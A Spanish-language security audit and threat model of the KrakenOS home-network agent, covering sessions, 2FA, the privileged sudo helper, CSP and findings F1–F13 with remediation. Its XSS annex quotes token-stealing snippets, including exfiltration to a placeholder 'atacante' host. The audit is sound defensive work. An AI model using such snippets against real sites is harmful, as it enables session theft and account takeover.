# Modelo de amenazas y auditoría de seguridad

> Auditoría de seguridad de KrakenOS — junio 2026. Revisa el código real de
> autenticación, autorización, criptografía de sesión y el límite de privilegios
> (helper sudoers). **No modifica código de producción**: identifica la postura
> actual, dónde un control está sólo respaldado por *código + unit test* (nunca
> ejercido contra un atacante real ni hardware real) y propone US de remediación.
>
> Alcance leído: `src/plugins/auth.ts`, `security-headers.ts`, `rate-limit-store.ts`,
> `socketio.ts`, `audit.ts`, `src/auth/keyring.ts`, `modules/auth/`, `modules/setup/`,
> `modules/webauthn/`, `src/webauthn/`, `src/privileged/runner.ts`,
> `scripts/krakenos-helper.sh` + `.sudoers.example`, `firewall/iptables.*`, `config/env.ts`,
> `server.ts`. Referencia de diseño: la especificación y la documentación interna del proyecto.

---

## 1. Resumen ejecutivo

KrakenOS tiene una postura de seguridad **deliberada y por encima de la media** para
una herramienta doméstica: JWT RS256 con rotación de claves por `kid`, refresh tokens
persistidos sólo como hash y rotatorios, bcrypt cost 12, 2FA WebAuthn atado al primer
factor, cabeceras de seguridad estrictas, validación JSON Schema en el borde, WebSocket
autenticado en el handshake y un proceso no-root que delega lo privilegiado en un helper
con allowlist. La comparación *afirmado vs. real* confirma que casi todo lo que `SPECS §9`
promete **está implementado de verdad**.

Los hallazgos no son agujeros abiertos sino **límites de defensa en profundidad** y
**controles sin verificar contra un adversario o hardware real**. Los tres más relevantes:

1. **El helper privilegiado acota el *verbo*, no el *ámbito*** (🟠): permitía `iptables`
   sobre cualquier cadena, `tc` sobre cualquier interfaz y `wg set` arbitrario. Es el
   último muro antes de root. ✅ **Resuelto:** el helper acota ahora también el
   ámbito (cadena/interfaz); ver F1.
2. **Ajustes "en caliente" sin cota superior** (🟠): `accessTokenTtl` y `loginRateLimit`
   se leían de `Setting` sin máximo; un valor enorme degradaba silenciosamente la sesión corta
   o el rate limit. ✅ **Resuelto** (cotas al escribir y al leer); ver F5.
3. **`TRUST_PROXY` es un booleano sin lista de proxies de confianza** (🟠): _resuelto_ (ahora
   admite nº de hops o lista de IPs/CIDRs y avisa del `true` inseguro; ver F2). Mal configurado,
   permite falsificar `X-Forwarded-For` y burlar el rate limit y la auditoría por IP.

Y un meta-hallazgo honesto: **todo el límite de privilegios (helper, sudoers, iptables/tc/wg)
es mock-first y nunca se ha ejercido con root ni hardware real** (este entorno no los tiene;
pendiente de la verificación con hardware real). Su corrección está respaldada por unit tests al contrato, no
por una verificación e2e.

---

## 2. Fronteras de confianza (trust boundaries)

```
   Internet
      │  (sin puertos de UI expuestos — sólo el endpoint WireGuard UDP)
      ▼
┌───────────────────────────────────────────────┐  ── Frontera A: VPN ──
│  WireGuard (10.8.0.0/24)                        │  Internet ↔ red interna
└───────────────────────────────────────────────┘
      │  HTTPS/WS sobre la VPN o LAN
      ▼
┌───────────────────────────────────────────────┐  ── Frontera B: API/Auth ──
│  Agente Fastify (proceso NO root)              │  cliente ↔ agente
│   · JWT RS256 + Keyring (kid)                  │  (pre-auth vs. autenticado vs. admin)
│   · Socket.io (auth en handshake)             │
└───────┬───────────────────────┬───────────────┘
        │                       │
        │ sudo -n               │ Prisma / fs
        ▼                       ▼
┌──────────────────┐   ┌────────────────────────┐  ── Frontera C: privilegio ──
│ krakenos-helper  │   │ SQLite (dev.db) + keys/ │  agente(no-root) ↔ root
│  (root, allowlist)│   │  + data/*.json + .env  │  ── Frontera D: datos en disco ──
└────────┬─────────┘   └────────────────────────┘
         │ wg / iptables / tc (root)
         ▼
┌───────────────────────────────────────────────┐  ── Frontera E: integración ──
│ Hardware: routers (SSH/REST), switches (SNMP), │  agente ↔ dispositivos
│ IoT (MQTT/HTTP/UDP), cámaras (RTSP)            │  (credenciales en .env)
└───────────────────────────────────────────────┘
```

| Frontera | Cruce | Control principal | Estado |
|---|---|---|---|
| **A — VPN** | Internet → red interna | WireGuard; ningún puerto de UI expuesto | Diseño correcto; **sin verificar con túnel real** |
| **B — API/Auth** | Cliente → agente | JWT RS256 (`authenticate`/`requireRole`), rate limit, WS auth en handshake | Implementado y unit-tested |
| **C — Privilegio** | Agente (no-root) → root | `SudoHelperRunner` + `krakenos-helper.sh` (allowlist) + sudoers `NOPASSWD` acotado a un binario | Implementado; allowlist por **verbo + ámbito** (cadena/interfaz ✔) · **sin ejercer con root real** |
| **D — Datos en disco** | Proceso → SQLite/`keys/`/`.env`/`data/` | Permisos de fichero del SO (verificados al arrancar); `keys/`,`*.db`,`.env` gitignored | Depende del despliegue; secretos en claro pero con aviso de permisos (F8 parcial) |
| **E — Integración** | Agente → hardware | Transporte inyectable; credenciales por `env` | Mock-first; **sin verificar con hardware** |

---

## 3. Activos

| Activo | Dónde vive | Protección actual | Impacto si se compromete |
|---|---|---|---|
| **Clave privada RS256** | `keys/*.pem` (disco, gitignored) | Permisos de fichero; cargada en memoria al arrancar (`env.ts:140`) | Falsificar **cualquier** sesión (access/refresh/mfa) |
| **Access token** | Cliente (**solo memoria**) | Firmado RS256, `iss`/`aud`, `exp` 900 s, `type:'access'` | Acceso de lectura/escritura hasta `exp`; **no revocable** (F9) |
| **Refresh token** | Cookie `httpOnly` en el cliente + **hash sha256** en `RefreshToken` | Ilegible por JS; rotatorio, revocable, sólo hash en DB, **detección de reuso** | Renovar sesión hasta revocación; un XSS ya no lo lee (F13 ✔), reuso revoca la familia (F4 ✔) |
| **Token `mfa-pending`** | Cliente, 120 s | Firmado, `type:'mfa-pending'`, `sub` cruzado con email | Reintentos de 2FA durante 120 s (no es access token) |
| **Hash de contraseña** | `User.passwordHash` | bcrypt cost 12 | Crackeo offline (mitigado por coste) |
| **Hash de backup codes** | `BackupCode.codeHash` | sha256 de 48 bits aleatorios | Bypass de 2FA si se filtra DB **y** se invierte (alta entropía) |
| **Clave pública WebAuthn** | `WebAuthnCredential.publicKey` | No es secreta; nunca expuesta por la API | Bajo |
| **Credenciales de hardware** | `.env` / `process.env` en claro | Permisos de fichero (verificados al arrancar) | SSH/REST/MQTT a routers, IoT y cámaras (F8, parcial) |
| **Helper sudo (root)** | `/usr/local/bin/krakenos-helper` | sudoers `NOPASSWD` + allowlist por verbo y ámbito | Acotado a la cadena/interfaz dedicadas (F1 ✔) |
| **Claves VAPID** | `Setting` (DB) | Sólo envío push; no es factor de auth | Bajo |
| **Contraseñas WiFi** | Sólo en memoria, delegadas al driver | Nunca devueltas en GET | No persistidas |
| **Log de auditoría** | `AuditLog` | `detail` truncado a 1 KB; escritura con reintentos; email hasheado | Resistente a picos de DB y sin PII en claro (F11 ✔) |

---

## 4. STRIDE por punto de entrada

### 4.1 `POST /api/auth/login` (público)
| Amenaza | Análisis |
|---|---|
| **S**poofing | Anti-enumeración con `bcrypt.compare` de tiempo constante incluso si el usuario no existe (`auth.service.ts:161-167`). ✔ |
| **T**ampering | JSON Schema estricto (`additionalProperties:false`, email/longitud). ✔ |
| **R**epudiation | `auth.login` / `auth.login_failed` auditados con IP (email hasheado). ✔ (con reintentos, F11) |
| **I**nfo disclosure | Mensaje genérico "Credenciales inválidas"; sin distinguir usuario inexistente. ✔ |
| **D**oS | Rate limit por IP (`max=rateLimitStore.getCurrent()`, def. 10/min) **+ lockout por cuenta con backoff** (F3). El spoofing por XFF se acotó (F2: nº de hops / lista de proxies). |
| **E**oP | Sin passkey → emite sesión; con passkey → sólo `mfaToken` (no tokens). Atadura de factores correcta. ✔ |

### 4.2 `POST /api/auth/refresh` (token de refresco)
- **T/E**: verifica firma por `kid`, exige `type:'refresh'`, comprueba hash en DB, revocado/expirado (`auth.service.ts:214-248`). ✔
- **R/Replay**: rota (revoca el actual, emite nuevo) **con detección de reuso**: reusar un token ya rotado revoca la familia del usuario y emite evento de seguridad (`auth.refresh_reuse`). ✔ (F4)
- **D**: rate limit 60/min por IP. ✔

### 4.3 `POST /api/setup/init` (público sólo si `user.count()==0`)
- **E**: transacción atómica `user + homeName`; el segundo `/init` en carrera recibe 409. ✔
- **Spoofing de identidad inicial**: ✅ cerrado — `/setup/init` exige el **token de configuración** que el agente imprime en su log/CLI al primer arranque (out-of-band), así el primer cliente ya no reclama el admin sin acceso al servidor (F10).

### 4.4 `POST /api/webauthn/authenticate/{options,verify}` y `/backup-codes/verify` (públicos)
- **E**: exigen `mfaToken` válido y `token.sub === user(email).id` (`webauthn.routes.ts:73-82`). La passkey **suma** factor, no reemplaza. ✔
- **R/Replay**: challenge consumido **antes** de verificar (de un solo uso, `webauthn.service.ts:245-256`). ✔
- **Concurrencia**: ✅ challenge **por ceremonia** en la tabla `WebAuthnChallenge`; dos ceremonias simultáneas (dos pestañas, registro+login) ya no se pisan (F6).
- **R**: fallos auditados como `auth.login_failed`. ✔

### 4.5 API autenticada (lectura) / admin (escritura)
- **E**: `authenticate` exige `type:'access'`; `requireRole('admin')` para escritura (`auth.ts:111-143`). Cobertura parametrizada por módulo (viewer→403, sin token→401). ✔
- **T**: JSON Schema por ruta con `additionalProperties:false` y `response` (validados en los bordes). ✔

### 4.6 Handshake de Socket.io (`io.use`)
- **S/E**: exige access token válido (`type:'access'`) en `auth.token` o `Bearer` (`socketio.ts:58-75`). ✔
- **Revocación**: auth en el handshake **+ re-verificación periódica** (cada 30 s): un token expirado o firmado con clave retirada corta la conexión (`auth:expired`). Acota la ventana al TTL + 30 s (F7 ✔). El access stateless no es revocable antes de `exp` (F9).

### 4.7 Invocación del helper privilegiado (`SudoHelperRunner` → `sudo -n helper`)
- **T/E**: `execFile` (sin shell) → no hay inyección de shell; argv pasa literal (`runner.ts:29-40`). ✔
- **E (ámbito)**: ✅ la allowlist del helper filtra **el verbo** (`iptables -A`, `tc qdisc`, `wg set`…) **y el ámbito** — cadena/interfaz (F1). Defensa en profundidad completada en el camino privilegiado.

### 4.8 Endpoints públicos de la pantalla de login
- `GET /api/system/info` → `{homeName}` (+ `version` solo si `PUBLIC_VERSION`); `GET /api/auth/last-session` → `null` salvo `PUBLIC_LAST_SESSION`.
- **I**: ✅ divulgación pre-auth **off por defecto**: `version` (fingerprinting/CVE) y la última sesión (IP+hora del admin) solo se exponen tras activar su flag. `homeName` se mantiene (branding del login, baja sensibilidad).

---

## 5. Tabla de hallazgos (afirmado vs. real)

> Severidad: 🔴 alta · 🟠 media · 🟡 baja. Ninguno es un agujero explotable de forma
> trivial desde fuera de la VPN; todos son **endurecimientos** o **controles sin verificar**.

| # | Sev | Hallazgo | Ubicación | Afirmado | Real |
|---|---|---|---|---|---|
| **F1** | 🟠 | **Allowlist del helper sólo por verbo, no por ámbito.** Permitía `iptables` sobre cualquier cadena (INPUT/FORWARD/…), `tc` sobre cualquier interfaz y `wg set`/`wg-quick save` arbitrarios. Es la última frontera antes de root. | `scripts/krakenos-helper.sh` | "allowlist estricta… no concede acceso libre a wg/iptables/tc" (doc interna, sudoers) | ✅ **Mitigado:** el helper acota ahora también el **ámbito** — `iptables` solo sobre la cadena `KRAKENOS` (+ enlace `FORWARD -j KRAKENOS`, sin reglas extra, sin otra tabla que `filter`), `tc` solo sobre la interfaz de QoS (`dev <iface>`) y `wg`/`wg-quick` solo sobre la interfaz WireGuard. El ámbito lo fija root (defaults del script + `/etc/krakenos/helper.conf`); `sudo` (env_reset) impide que el agente lo amplíe. Tests por caso permitido/denegado. |
| **F2** | 🟠 | **`TRUST_PROXY` booleano sin proxies de confianza.** Activado sin un proxy que reescriba `X-Forwarded-For`, el cliente falsifica `req.ip` → burla rate limit de login y envenena la auditoría/last-session. | `config/env.ts` (`parseTrustProxy`), `server.ts` | "TRUST_PROXY opcional… tras nginx" (SPECS §9) | ✅ **Mitigado:** `parseTrustProxy` admite **nº de hops** (`TRUST_PROXY=1`) o **lista de IPs/CIDRs** de proxies de confianza, no solo el booleano; `true` (confiar en cualquiera) sigue por compat pero **avisa al arrancar** (`trustProxyWarnings`). Tests de `req.ip` con/sin proxy. |
| **F3** | 🟠 | **Rate limit de login sólo por IP, sin lockout por cuenta** ni backoff. Fuerza bruta distribuida (varias IP de VPN) o spray sobre muchas cuentas no se frenaba por usuario. | `auth/login-lockout.ts`, `auth.routes.ts` | "Rate limiting en /auth/login" (SPECS §9) | ✅ **Mitigado:** se extendió el rate-limit a los endpoints públicos de 2FA + `mfaToken` de un solo uso, y un **lockout por cuenta** (`auth/login-lockout.ts`): tras 5 fallos consecutivos la cuenta se bloquea con **backoff exponencial** (30 s → tope 1 h), se limpia al primer login correcto y audita `auth.login_locked` (+ push). Se aplica a cualquier email (no enumera). |
| **F4** | 🟠 | **Rotación de refresh sin detección de reuso.** Un refresh robado y usado revocaba el del legítimo pero no revocaba la familia ni alertaba; el atacante se quedaba con la sesión rotada. | `auth.service.ts` (`refresh`), `schema.prisma` (`RefreshToken.rotatedAt`) | "refresh tokens rotatorios" (SPECS §9) | ✅ **Mitigado:** reuse-detection estilo OAuth — al rotar se marca `rotatedAt`; si llega un token **ya rotado** se revoca **toda la familia** del usuario y se audita `auth.refresh_reuse` (+ push). Un token revocado por logout/admin (sin `rotatedAt`) no dispara el nuke: rechazo simple. |
| **F5** | 🟠 | **Cota superior ausente en ajustes en caliente.** `accessTokenTtl` (y `loginRateLimit`) se leían de `Setting` con sólo `n>0`; un admin podía fijar un TTL enorme → access tokens casi eternos, anulando la "vida corta". | `config/settings-bounds.ts`, `auth.service.ts`, `rate-limit-store.ts` | "access de vida corta (default 900 s)" (SPECS §9) | ✅ **Mitigado:** cotas en `config/settings-bounds.ts` (`accessTokenTtl` 60–3600 s, `loginRateLimit` 1–1000) aplicadas **al escribir** (`PATCH /system/settings`, el valor guardado y devuelto se acota) y **al leer** (`accessTtl`/`rateLimitStore.update`, defensa en profundidad). Tests de borde. |
| **F6** | 🟡 | **Desafío WebAuthn = un solo campo en `User`.** Ceremonias concurrentes (registro+login, dos pestañas) se pisaban el challenge → fallo/usabilidad; no es fuga, pero sí DoS suave del 2FA. | `webauthn.service.ts`, `schema.prisma` (`WebAuthnChallenge`) | (no afirmado) | ✅ **Mitigado:** tabla `WebAuthnChallenge` (una fila por ceremonia, con `type` register/authenticate). Al verificar se localiza el desafío **concreto** que presenta la respuesta (challenge del `clientDataJSON`) y se consume de un solo uso → ceremonias concurrentes no se interfieren. Mantiene el "consumir antes de verificar". |
| **F7** | 🟡 | **Socket.io autentica sólo en el handshake.** Tras expirar el token, la conexión seguía recibiendo inventario/tráfico/IoT hasta desconectar. | `socketio.ts` (`sweepStaleSockets`) | "lectura autenticada igual que la API" (doc interna, especificación §9) | ✅ **Mitigado:** barrido periódico (cada 30 s) re-verifica el token de cada socket (firma + `exp` + `type`); si ya no es válido (expirado o clave retirada en rotación) emite `auth:expired` y corta la conexión → acota la ventana de sesión obsoleta al TTL + 30 s. El cliente refresca y reconecta. (Nota: el access stateless no es revocable antes de `exp`, F9; el corte por expiración es la garantía.) |
| **F8** | 🟠 | **Credenciales de integración en claro.** SSH/REST/SNMP/MQTT y `TAPO_EMAIL`/`PASSWORD` viven en `.env`/`process.env`; un `.env` legible o un compromiso del host filtra todas las credenciales de la red. | `config/env.ts`, `config/secret-permissions.ts` | "Deps opcionales… se instalan en el servidor" (doc interna) | 🟡 **Parcial:** el escaneo de secretos detecta los commiteados y el arranque verifica los permisos al arrancar y **avisa** si `.env` o la clave privada RS256 son legibles por grupo/otros (`chmod 600`). **Sigue sin** almacén de secretos ni cifrado en reposo (queda como mejora futura). |
| **F9** | 🟡 | **Access token no revocable antes de `exp`.** Logout/revoke sólo afectan a refresh tokens; el access vive hasta caducar (stateless). | `auth.service.ts:65-96`, `auth.ts` | "Logout con invalidación de token" (SPECS §4.1) | Se invalida el **refresh**; el access sigue válido su TTL. Aceptable con TTL corto, ahora **garantizado** por la cota de F5 (≤ 3600 s). |
| **F10** | 🟡 | **Ventana de primer admin.** `/setup/init` es público mientras no haya usuarios; el primer cliente que alcanzaba el agente recién instalado reclamaba el admin (sin token out-of-band). | `setup.routes.ts`, `setup/setup-token.ts` | "Admin por el wizard /setup" (doc interna) | ✅ **Mitigado:** al arrancar sin usuarios el agente genera un token de configuración y lo **imprime en el log/CLI** (out-of-band); `/setup/init` lo exige (`SETUP_TOKEN_INVALID` si falta/erróneo, intento auditado) y lo invalida al crear el admin. Solo quien tiene acceso al servidor completa el setup. Sigue atómico contra carreras. |
| **F11** | 🟡 | **Auditoría best-effort.** Un fallo de escritura sólo emitía `log.warn`; eventos de seguridad podían perderse bajo presión de DB. El `detail` guardaba el email de logins fallidos (PII). | `plugins/audit.ts` | "Toda acción relevante queda registrada" (SPECS §9) | ✅ **Mitigado:** escritura con **reintentos por backoff** (`persistAuditWithRetry`, 100/500/2000 ms; sigue fire-and-forget, no bloquea) antes de rendirse → resiste picos transitorios de DB. **PII minimizada:** los eventos que llevaban el email (`login_failed`/`login_locked` en auth y webauthn) ahora guardan `hashEmail()` (sha256 truncado, `email:` prefijo) — correlacionable, sin texto plano. Tests del reintento (pura) y del hash. |
| **F12** | 🟡 | **Patrón IP/CIDR laxo.** El IPv4 no acotaba octetos (aceptaba `999.999.999.999`) y el IPv6 era permisivo. | `firewall.schemas.ts` (`IP_CIDR_PATTERN`), `firewall/iptables.helpers.ts` | "se validan como IP/CIDR (defensa frente a inyección…)" (SPECS §9) | ✅ **Mitigado:** se añadieron validadores anti-inyección puros para wg/qos/vlan, y se endureció la regla de firewall: `IP_CIDR_PATTERN` **estricto** (octetos 0-255 y prefijo 0-32 acotados por el patrón; IPv4-only, eliminado el IPv6 permisivo que ni se aplicaría —solo `iptables`, no `ip6tables`) **+** revalidación con `assertIpv4Cidr` en el builder de argv (defensa en profundidad) **+ test fuzz** del builder y del validador (invariante: todo valor que pasa solo contiene `[0-9./]`). |
| **F13** | 🔴 | **Access + refresh token en `localStorage` (legibles por JS).** El store usaba `zustand/persist` → ambos tokens en `localStorage`; un XSS leía el refresh (30 días) → toma de cuenta persistente. | `web/src/store/auth.store.ts`, `agent/src/auth/session-cookie.ts` | "JWT… refresh persistido solo como hash" (SPECS §9 — sólo en el servidor) | ✅ **Resuelto:** el refresh token vive en una **cookie `httpOnly`+`SameSite=Strict`+`Secure`(condicional)** (ilegible por JS), emitida por los 5 emisores de sesión; el access token vive **solo en memoria** (sin `persist`) y se rehidrata al cargar con un `refresh()` que usa la cookie. `refresh`/`logout`/revoke-others leen la cookie, no el cuerpo. Un XSS ya no puede exfiltrar el refresh (la CSP cerró además la exfil off-origin). Residual: abuso en-página de la sesión viva mientras dura el XSS (inherente; el access es de vida corta, F9). |

### Controles verificados como correctos (no son hallazgos)
- **Sin `alg:none`**: la verificación fija `algorithms:['RS256']` y `allowedIss`/`allowedAud` (`auth.ts:89,103-108`); el `kid` sólo elige clave pública, nunca el algoritmo. ✔
- **Rotación RS256 por `kid`** derivado del PEM; tokens previos siguen válidos en el solape (`keyring.ts`). ✔
- **Anti-enumeración** en login con compare de tiempo constante (`auth.service.ts:161-167`). ✔
- **Atadura de factores 2FA**: `mfaToken` cruza `sub`↔email; `mfa-pending` no sirve como access. ✔
- **Challenge de un solo uso** consumido antes de verificar. ✔
- **Cabeceras de seguridad** estrictas (CSP sin inline, `frame-ancestors 'none'`, COOP/CORP, HSTS con TLS). ✔
- **Sin inyección de shell** en el camino privilegiado (`execFile`, no `exec`). ✔
- **Refresh sólo como hash sha256**; contraseñas con bcrypt 12. ✔

> **Honestidad sobre la verificación:** todos los controles del **límite de privilegios y de
> integración** (helper, sudoers, iptables/tc/wg, SSH/MQTT/SNMP) están respaldados por
> *código + unit tests al contrato*, pero **nunca se han ejercido con root ni con hardware/
> servicios reales** en este entorno (pendiente de la verificación con hardware). La frontera A (túnel
> WireGuard) y la E (dispositivos) son, a día de hoy, **garantías de diseño no probadas e2e**.

---

## 6. Lista priorizada de remediación

> Cada hallazgo quedó mapeado a una historia de seguimiento.
> Atacar **una a una** (1 historia → 1 branch → 1 merge), por severidad.

### Estado de implementación (actualización)

> Resumen de la remediación:

| Tema | Hallazgos | Estado |
|---|---|---|
| Validación anti-inyección en el helper privilegiado | F12 (+ refuerza F1 con control-chars) | ✅ hecho |
| Rate-limit + anti-replay en endpoints públicos de auth | F3 (parcial), ventana de replay del `mfaToken` | ✅ hecho |
| Cobertura exhaustiva de authz + validación; fix 🔴 (viewer podía `PATCH` metadatos de dispositivo) | nuevo hallazgo de authz, no en F1-F13 | ✅ hecho |
| Reducir radio de impacto de XSS en tokens (CSP `connect-src 'self'`) | F13 (parcial) | ✅ hecho |
| Secret scanning (gitleaks, bloqueante) + SAST (semgrep) en CI | endurece F8 (detecta secretos commiteados) | ✅ hecho |
| Allowlist del helper por ámbito (cadena/interfaz) | F1 (arreglo) | ✅ hecho |
| Cotas en ajustes en caliente (`accessTokenTtl`/`loginRateLimit`) | F5 (arreglo) | ✅ hecho |
| `TRUST_PROXY` seguro (nº de hops / lista de proxies) | F2 (arreglo) | ✅ hecho |
| Refresh token en cookie `httpOnly` + access sólo en memoria | F13 (arreglo real) | ✅ hecho |
| Lockout por cuenta + backoff en login | F3 (arreglo) | ✅ hecho |
| Detección de reuso de refresh (revoca familia + alerta) | F4 (arreglo) | ✅ hecho |
| Verificación de permisos de ficheros con secretos al arrancar | F8 (parcial) | ✅ hecho |
| Re-verificación periódica de sesión en Socket.io | F7 (arreglo) | ✅ hecho |
| Cierre de la ventana de primer admin (token out-of-band) | F10 (arreglo) | ✅ hecho |
| Challenge WebAuthn por ceremonia (tabla propia) | F6 (arreglo) | ✅ hecho |
| Reducir divulgación pre-auth (`version`/`last-session` tras flag) | F5/doc (arreglo) | ✅ hecho |
| Validación IP/CIDR estricta + fuzz del builder de iptables | F12 (refuerzo) | ✅ hecho |
| Auditoría robusta (reintentos) + minimizar PII (hash email) | F11 (arreglo) | ✅ hecho |
| Verificación e2e del límite de privilegios (hardware/root real) | F9 + e2e | ⏳ pendiente (no es código) |

**Pendientes destacados:** toda la remediación de **código** del modelo (F1…F13) está **cerrada**. Quedan
solo (a) la **verificación e2e del límite de privilegios con hardware/root real** (no es código), y
(b) la mejora futura de F8 — un **secret store / cifrado en reposo**: hoy se detectan secretos
commiteados y se verifican los permisos de los ficheros, pero no se cifra.

### Prioridad alta (🟠) — endurecer fronteras de privilegio y sesión
1. **Allowlist del helper por ámbito (F1).** ✅ **Hecho.** `krakenos-helper.sh` exige que
   `iptables` opere sólo sobre la cadena `KRAKENOS` (y su enlace `FORWARD -j KRAKENOS`, sin reglas
   extra ni otra tabla que `filter`), `tc` sólo sobre la interfaz configurada (`dev <iface>`) y
   `wg`/`wg-quick` sólo sobre `wg0`. Resto rechazado (64). Ámbito configurable por root (defaults +
   `/etc/krakenos/helper.conf`); `sudo`/`env_reset` impide que el agente lo amplíe. Tests del helper
   por caso permitido/denegado (incl. ámbito a medida).
2. **Cotas en ajustes en caliente (F5).** ✅ **Hecho.** Cotas en `config/settings-bounds.ts`
   (`accessTokenTtl` 60–3600 s, `loginRateLimit` 1–1000) aplicadas al escribir y al leer, con test de borde.
3. **`TRUST_PROXY` seguro (F2).** ✅ **Hecho.** `parseTrustProxy` admite nº de hops o lista de
   IPs/CIDRs de proxies de confianza, y `trustProxyWarnings` avisa del `true` inseguro al arrancar.
   Test de `req.ip` con/sin proxy.
4. **Lockout por cuenta + backoff en login (F3).** ✅ **Hecho.** `auth/login-lockout.ts`:
   contador por email (además del límite por IP) con backoff exponencial (30 s → tope 1 h), reset al
   primer login correcto y por inactividad; audita `auth.login_locked` (+ push). Aplica a cualquier
   email (anti-enumeración).
5. **Detección de reuso de refresh (F4).** ✅ **Hecho.** `RefreshToken.rotatedAt` marca los
   rotados; reusar un token rotado revoca toda la familia del usuario y audita `auth.refresh_reuse`
   (+ push).
6. **Gestión de secretos de integración (F8).** ✅ **Hecho (parcial).** `config/secret-permissions.ts`
   verifica al arrancar los permisos de `.env` y de la clave privada RS256 y **avisa** si son legibles por
   grupo/otros (recomienda `chmod 600`). **Pendiente como mejora futura:** almacén de secretos / cifrado en reposo.

### Prioridad media (🟡) — reducir ventana y superficie
7. **Re-verificación de sesión en Socket.io (F7).** ✅ **Hecho.** Barrido cada 30 s
   (`sweepStaleSockets`) re-verifica el token de cada socket y corta (`auth:expired` + disconnect) los
   expirados o firmados con clave retirada; el cliente refresca y reconecta.
8. **Cierre de la ventana de primer admin (F10).** ✅ **Hecho.** `setup/setup-token.ts`: al
   arrancar sin usuarios se genera un token impreso en el log/CLI y exigido por `/setup/init` (se invalida
   tras crear el admin). El wizard web lo pide cuando `requiresToken`.
9. **Endurecer challenge WebAuthn (F6).** ✅ **Hecho.** Tabla `WebAuthnChallenge` (una fila por
   ceremonia, `type` register/authenticate); al verificar se consume el desafío concreto que presenta la
   respuesta (challenge del `clientDataJSON`), soportando ceremonias concurrentes.
10. **Reducir divulgación pre-auth (F5).** ✅ **Hecho.** `version` (en `system/info`) y
    `last-session` están **off por defecto**, tras los flags `PUBLIC_VERSION`/`PUBLIC_LAST_SESSION`
    (`config/env.ts:publicDisclosure`). `homeName` se mantiene (branding del login).
11. **Validación IP/CIDR estricta + fuzz (F12).** ✅ **Hecho.** `IP_CIDR_PATTERN` estricto
    (octetos 0-255/prefijo 0-32, IPv4-only) + `assertIpv4Cidr` en el builder de `iptables` (defensa en
    profundidad) + test fuzz determinista (invariante: lo que pasa solo contiene `[0-9./]`).
12. **Auditoría de eventos de seguridad robusta (F11).** ✅ **Hecho.** `persistAuditWithRetry`
    reintenta con backoff (100/500/2000 ms) ante fallo transitorio antes de rendirse; los eventos con
    email (`login_failed`/`login_locked`) guardan `hashEmail()` en vez del correo en claro.

### Riesgo conocido (no es código)
13. **Verificación e2e del límite de privilegios con hardware/root real.** Ejercer el helper,
    sudoers e iptables/tc/wg en un despliegue real (frontera C/E) — hoy sólo mock + unit test.
    Enlaza con la checklist interna de verificación con hardware real.

---

## 7. Anexo — Almacenamiento de tokens en el cliente y radio de impacto de XSS

Revisión del cliente web (`apps/web/src/store/auth.store.ts`, `lib/api.ts`, `lib/socket.ts`).

> **Actualización (hecho):** lo que sigue describe la postura **previa**. Tras el cambio a cookie el
> refresh vive en una cookie `httpOnly` (ilegible por JS) y el access solo en memoria; ver §7.5.

### 7.1 Dónde viven exactamente los tokens

| Token | Vida | Ubicación (tras) |
|---|---|---|
| **access** | 15 min (def.) | Estado de Zustand (**solo memoria**; ya no se persiste) |
| **refresh** | 30 días, rotatorio | **Cookie `httpOnly`+`SameSite=Strict`** (ilegible por JS) |

El store usa `zustand/persist` con `{ name: 'krakenos-auth' }` y **storage por defecto =
`localStorage`** (`auth.store.ts:62-107`). No hay `partialize`, así que se persiste todo el
estado: `user` + `tokens.{accessToken, refreshToken, expiresIn}`. En claro, bajo la clave
`krakenos-auth`. `lib/api.ts` lee `accessToken` del store y lo manda como `Authorization:
Bearer`; `lib/socket.ts` lo manda en el handshake; `auth.store.refresh()/logout()` leen el
`refreshToken` del store y lo mandan en el **cuerpo** de `POST /auth/refresh|logout`.
**No se usa ninguna cookie** para la sesión.

### 7.2 Radio de impacto de un XSS (si el atacante ejecuta JS en el origen)

```js
JSON.parse(localStorage['krakenos-auth']).state.tokens
// → { accessToken (15 min), refreshToken (30 días), expiresIn }
```

- **Refresh token = joya de la corona:** credencial **persistente de 30 días** que acuña
  access tokens a voluntad. Robado, da **toma de cuenta completa y duradera**, usable
  **fuera del navegador** (offline, desde cualquier sitio), y **sobrevive a la rotación**
  (el atacante rota a su favor; el legítimo se desloguea, F4).
- **Importante y honesto:** mover los tokens a memoria (sin `persist`) **no** detiene a un XSS
  *en vivo* — JS puede leer la memoria de JS (`useAuthStore.getState()`). Sólo
  quita la copia *en reposo* (tras recargar / pestaña nueva). La **única** forma de que el
  refresh sea ilegible por JS es sacarlo de JS: **cookie `httpOnly`**.

### 7.3 Evaluación de la CSP actual (`plugins/security-headers.ts`) frente a esto

| Directiva | Veredicto |
|---|---|
| `script-src 'self'` (sin `unsafe-inline`/`eval`) | **Bien.** Corta el vector principal de XSS (inline/eval/script externo). Residual: dependencia vulnerable o sink DOM. |
| `img-src 'self' data: blob:` | Bien — sin host externo ⇒ no hay exfil por `new Image().src`. |
| `connect-src 'self' ws: wss:` *(antes)* | **Agujero.** El comodín `ws:/wss:` permitía `new WebSocket('wss://atacante')` ⇒ **canal de exfiltración** del token desde un XSS. |
| `style-src 'unsafe-inline'` | Necesario (React/Recharts); se mantiene. |

**Implementado:** `connect-src 'self'` (quitados `ws:/wss:`; en CSP3 `'self'` cubre el
WebSocket del mismo origen) + `frame-src 'none'`. Con `connect-src 'self'` un XSS **ya no puede
exfiltrar** el token por `fetch`/XHR/WebSocket/beacon a un host externo (la app es local-first,
sin destinos externos legítimos).

**Límite honesto de la CSP:** sigue **sin** ser contención total. La CSP **no** impide (a) el
**abuso en-página** de la sesión (un XSS llama la API al mismo origen con el token), ni (b) la
exfiltración por **navegación de nivel superior** (`location = 'https://atacante/?'+token`, que no
gobierna `connect-src` y para la que `navigate-to` está deprecada). Por eso la CSP es **mitigación
en profundidad**, no la solución: mientras el refresh sea legible por JS, el riesgo residual es alto.

### 7.4 Cómo se implementó

El arreglo —**refresh en cookie `httpOnly`+`SameSite` + access sólo en memoria**— se hizo después,
tocando de forma transversal:

1. **Cinco emisores de sesión** (`auth/login`, `setup/init`, `webauthn authenticate/verify`,
   `backup-codes/verify`, `auth/refresh`) fijan la cookie vía un helper común (`auth/session-cookie.ts:sendSession`).
2. El **contrato por cuerpo** de `auth/refresh` y `auth/logout` pasó a leer de cookie (`readRefreshCookie`);
   se quitó `refreshToken` de los schemas de respuesta y los ~30 tests se migraron a cookies.
3. **"Cerrar otras sesiones"** identifica la sesión a conservar por la **cookie**, no por el cuerpo.
4. **Frontend:** el store dejó de persistir (access solo en memoria); al cargar, `bootstrapSession()`
   hace `refresh()` por cookie y, si hay sesión, carga el usuario con `/auth/status`.
